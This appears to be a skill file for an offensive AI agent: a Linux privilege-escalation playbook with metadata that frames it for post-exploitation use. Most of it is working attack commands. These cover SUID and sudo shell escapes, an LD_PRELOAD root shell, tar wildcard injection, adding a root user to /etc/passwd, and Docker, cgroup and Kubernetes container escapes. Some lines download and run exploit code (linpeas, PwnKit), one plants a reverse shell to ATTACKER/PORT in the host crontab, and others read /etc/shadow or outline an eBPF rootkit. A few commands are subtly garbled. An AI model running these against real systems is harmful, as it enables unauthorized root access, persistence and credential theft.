---
name: privesc-linux
description: Linux privilege escalation — SUID/SGID abuse, kernel exploits, capabilities, sudo misconfig, cron jobs, writable paths, container escape
metadata:
  type: offensive
  phase: post-exploitation
  tools: linpeas, pspy, gtfobins, linux-exploit-suggester
kill_chain:
  phase: [exploit, actions]
  step: [4, 7]
  attck_tactics: [TA0004]
depends_on: [network-attack, exploit-development]
feeds_into: [red-team-ops, advanced-redteam]
inputs: [shell_access, os_fingerprint]
outputs: [elevated_access, finding_record]
---

# Linux Privilege Escalation

## When to Activate

- Gained initial shell on Linux target, need root
- Post-exploitation privilege escalation
- Container escape scenarios
- CTF challenges requiring privesc

## Automated Enumeration

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# pspy (process monitoring without root)
./pspy64
```

## Manual Enumeration

### System Info
```bash
uname -a                    # Kernel version
cat /etc/os-release         # OS version
id                          # Current user/groups
env                         # Environment variables
cat /etc/passwd             # Users
cat /etc/crontab            # Cron jobs
ls -la /etc/cron*           # All cron directories
mount                       # Mounted filesystems
df -h                       # Disk usage
ip addr / ifconfig          # Network interfaces
netstat -tulpn / ss -tulpn  # Listening services
ps aux                      # Running processes
```

### SUID/SGID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Check GTFOBins for each:
# https://gtfobins.github.io/#+suid
# Common exploitable SUID:
# - /usr/bin/find → find . -exec /bin/sh -p \;
# - /usr/bin/vim → vim -c ':!/bin/sh'
# - /usr/bin/python3 → python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
# - /usr/bin/env → env /bin/sh -p
# - /usr/bin/nmap (old) → nmap --interactive → !sh
```

### Capabilities
```bash
getcap -r / 2>/dev/null

# Exploitable capabilities:
# cap_setuid+ep → set UID to 0
#   python3: python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
# cap_dac_read_search → read any file
# cap_net_raw → packet sniffing
# cap_sys_admin → mount filesystems, abuse cgroups
# cap_sys_ptrace → inject into processes
```

### Sudo
```bash
sudo -l  # List allowed commands

# Exploitable sudo entries:
# (ALL) NOPASSWD: /usr/bin/vim → :!/bin/sh
# (ALL) NOPASSWD: /usr/bin/less → !/bin/sh
# (ALL) NOPASSWD: /usr/bin/awk → awk 'BEGIN {system("/bin/sh")}'
# (ALL) NOPASSWD: /usr/bin/find → find . -exec /bin/sh \;
# (ALL) NOPASSWD: /usr/bin/python3 → python3 -c 'import pty;pty.spawn("/bin/bash")'
# (ALL) NOPASSWD: /usr/bin/env → env /bin/sh
# (ALL) NOPASSWD: /usr/bin/perl → perl -e 'exec "/bin/sh"'

# LD_PRELOAD (if env_keep+=LD_PRELOAD in sudoers)
# Compile: gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
# pe.c: void _init() { setuid(0); system("/bin/bash -p"); }
# sudo LD_PRELOAD=/tmp/pe.so /allowed/command
```

### Cron Jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
# Check for writable scripts called by root cron
# Check for wildcard injection (tar, rsync with *)

# Wildcard injection (tar):
# If cron runs: tar czf /backup/backup.tar.gz *
# Create: --checkpoint=1 --checkpoint-action=exec=sh shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > shell.sh
```

### Writable Files/Paths
```bash
# Writable /etc/passwd
echo 'hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash' >> /etc/passwd

# Writable service files
find /etc/systemd/system -writable -type f 2>/dev/null
# Modify ExecStart to reverse shell

# Writable PATH directories
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable -type d 2>/dev/null
# Place malicious binary with name of command run by root

# Writable library paths
find / -writable -name "*.so" 2>/dev/null
ldconfig -v 2>/dev/null | grep -v "^$"
```

### Kernel Exploits
```bash
uname -r
# Search: searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Notable kernel exploits:
# DirtyPipe (CVE-2022-0847) — Linux 5.8-5.16.11
# DirtyCow (CVE-2016-5195) — Linux 2.6.22-4.8.3
# PwnKit (CVE-2021-4034) — pkexec, almost all Linux
# Sequoia (CVE-2021-33909) — filesystem layer, most kernels
# GameOver(lay) (CVE-2023-2640) — Ubuntu OverlayFS
```

### Docker/Container Escape
```bash
# Check if in container
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv

# Docker socket mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Privileged container
fdisk -l  # can see host disks
mount /dev/sda1 /mnt && chroot /mnt

# Cap SYS_ADMIN + apparmor=unconfined
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
# Then abuse release_agent for host command execution

# CVE-2019-5736 (runc overwrite)
# Overwrite /usr/bin/runc on host via /proc/self/exe
```

### NFS
```bash
showmount -e $TARGET
# If no_root_squash is set:
# Mount share, create SUID binary as root, execute on target
mount -t nfs $TARGET:/share /mnt
cp /bin/bash /mnt/rootbash && chmod +s /mnt/rootbash
# On target: /share/rootbash -p
```

## Advanced: Kernel Exploitation

### Dirty Pipe (CVE-2022-0847)
```c
// Overwrite any file regardless of permissions — Linux 5.8 to 5.16.11
// Exploit: splice() into pipe → write over page cache → modifies file

// Usage: overwrite /etc/passwd to add root user
// Or: overwrite SUID binary with custom code
// Or: overwrite /usr/bin/su with shell that drops to root

#include <unistd.h>
#include <fcntl.h>
// 1. Open target file (read-only is fine)
int fd = open("/etc/passwd", O_RDONLY);
// 2. Create pipe, fill and drain (set PIPE_BUF_FLAG_CAN_MERGE)
int pipefd[2]; pipe(pipefd);
write(pipefd[1], buf, PAGE_SIZE); // fill pipe
read(pipefd[0], buf, PAGE_SIZE);  // drain pipe
// 3. Splice target file into pipe (references page cache)
splice(fd, &offset, pipefd[1], NULL, 1, 0);
// 4. Write to pipe — overwrites page cache (and the file)
write(pipefd[1], "root::0:0::/root:/bin/bash\n", 27);
```

### GameOver(lay) (CVE-2023-2640 + CVE-2023-32629)
```bash
# Ubuntu-specific OverlayFS privilege escalation
# Exploit: set trusted.overlay.metacopy xattr on file in overlay
# Kernel treats it as privileged overlay metadata

unshare -rm sh -c "
  mkdir l u w m &&
  cp /u*/b*/p]asswd l/
  setcap cap_setuid+eip l/passwd &&
  mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &&
  touch m/--hierarchical &&
  u/passwd
"
# Result: arbitrary capabilities on arbitrary files → root
```

### Dirty Cred (CVE-2022-2588)
```c
// Swap kernel credentials by exploiting object reuse in SLAB allocator
// When cred structure is freed and reallocated, attacker controls new cred
// Works across kernel versions — generic technique

// Strategy:
// 1. Trigger vulnerability that frees a credential object
// 2. Spray the slab cache with controlled objects of same size
// 3. Object reuse → attacker's data interpreted as credentials
// 4. Kernel uses corrupted cred → privilege escalation
```

### eBPF Exploitation
```bash
# eBPF programs run in kernel — vulnerabilities = kernel code execution
# Common eBPF vulnerabilities:
# - Verifier bypass → arbitrary kernel read/write
# - Type confusion in BPF maps
# - OOB access via crafted BPF programs

# CVE-2021-31440: eBPF verifier bounds tracking issue
# CVE-2021-3490: eBPF ALU32 bounds tracking
# CVE-2023-2163: eBPF verifier range tracking

# Check if unprivileged BPF is allowed:
cat /proc/sys/kernel/unprivileged_bpf_disabled
# 0 = unprivileged users can load BPF programs (exploitable)
# 1 = restricted to CAP_BPF/CAP_SYS_ADMIN
```

### Netfilter / nftables Exploitation
```bash
# Linux firewall subsystem runs in kernel — bugs = root
# CVE-2022-25636 (nft_fwd_dup_netdev_offload OOB write)
# CVE-2023-0179 (nftables stack buffer overflow)
# CVE-2023-32233 (nf_tables use-after-free)
# CVE-2024-1086 (nf_tables double-free)

# CVE-2024-1086 exploit:
# User namespace + nftables → double-free in page allocator
# Spray + overwrite page table entries → arbitrary kernel R/W
# Modify current task's credentials → root
# Works on kernels 5.14 to 6.6 (wide coverage)
```

## Advanced: Namespace & Container Breakout

### User Namespace Escalation
```bash
# User namespaces allow unprivileged users to get "root" inside namespace
# Combine with kernel bugs for real root:

# Create user namespace with root mapping
unshare -Urm

# Inside namespace: mount, pivot_root, access /proc
# Exploit kernel bugs that trust namespace root
# Example: OverlayFS trusted xattr bypass (CVE-2023-2640)
```

### Docker Breakout Techniques
```bash
# 1. Docker socket exposed (/var/run/docker.sock)
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine
chroot /host bash

# 2. Privileged container (--privileged)
# Mount host filesystem
mkdir /host && mount /dev/sda1 /host
chroot /host

# Write to host crontab
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> /host/etc/crontab

# 3. CAP_SYS_ADMIN + AppArmor=unconfined
# cgroup release_agent escape
d=/tmp/cgrp && mkdir $d && mount -t cgroup -o rdma cgroup $d
mkdir $d/x && echo 1 > $d/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > $d/x/cgroup.procs"
cat /output

# 4. CAP_SYS_PTRACE
# Inject into host PID 1 via /proc/1/root
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# 5. Exposed /proc/sysrq-trigger
echo b > /proc/sysrq-trigger  # Reboot host
# Or: echo c > /proc/sysrq-trigger  # Kernel crash

# 6. Host PID namespace (--pid=host)
# See all host processes, inject into them
ps aux  # Shows host processes
cat /proc/1/root/etc/shadow  # Read host files via /proc
```

### Kubernetes Pod Escape
```bash
# 1. Service account token → API server access
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk https://kubernetes.default.svc/api/v1/ \
  -H "Authorization: Bearer $TOKEN"

# Check permissions
kubectl auth can-i --list --token=$TOKEN

# 2. If can create pods → mount host filesystem
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh", "-c", "sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF
kubectl exec -it escape -- chroot /host bash

# 3. hostNetwork=true → access host network stack
# Sniff traffic, access localhost services (kubelet 10250, etcd 2379)
```

## Advanced: Polkit & D-Bus Exploitation

### PwnKit (CVE-2021-4034)
```bash
# pkexec (SUID polkit binary) — almost universal Linux privesc
# Out-of-bounds write via argc=0 → environment variable injection
# Exploit: run pkexec with empty argv → it reads env as argv[1]
# Inject GCONV_PATH → load attacker-controlled shared library as root

# One-liner:
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x PwnKit && ./PwnKit  # instant root shell

# Affected: polkit 0.113-0.118 (2009-2022, nearly every Linux distro)
```

### D-Bus Service Exploitation
```bash
# Enumerate D-Bus services
busctl list
dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Find services running as root with permissive policies
# Check policy files: /etc/dbus-1/system.d/*.conf, /usr/share/dbus-1/system.d/*.conf
# Look for: <allow send_destination="..."/> without user restrictions

# Abuse vulnerable D-Bus services:
# 1. Services that execute commands based on user input
# 2. Services that modify system files (PackageKit, NetworkManager)
# 3. Services with authentication bypass
```

## Advanced: eBPF Persistence
```bash
# eBPF programs survive process death if pinned to BPF filesystem
# Load rootkit-like eBPF program → pin to /sys/fs/bpf/
# Program intercepts syscalls, hides files/processes, creates backdoor

# XDP (eXpress Data Path) program for network backdoor:
# Attach to network interface → inspect incoming packets
# If packet contains magic bytes → execute command
# Runs in kernel context — invisible to userland monitoring

# eBPF programs can:
# - Hook any kernel function (kprobe)
# - Intercept syscalls (tracepoint)
# - Modify network packets (XDP/TC)
# - Access kernel data structures (BTF)
# - Survive process restarts (pinning)

# Check for eBPF rootkits:
bpftool prog list  # List loaded BPF programs
bpftool map list   # List BPF maps
ls /sys/fs/bpf/    # Check pinned programs
```
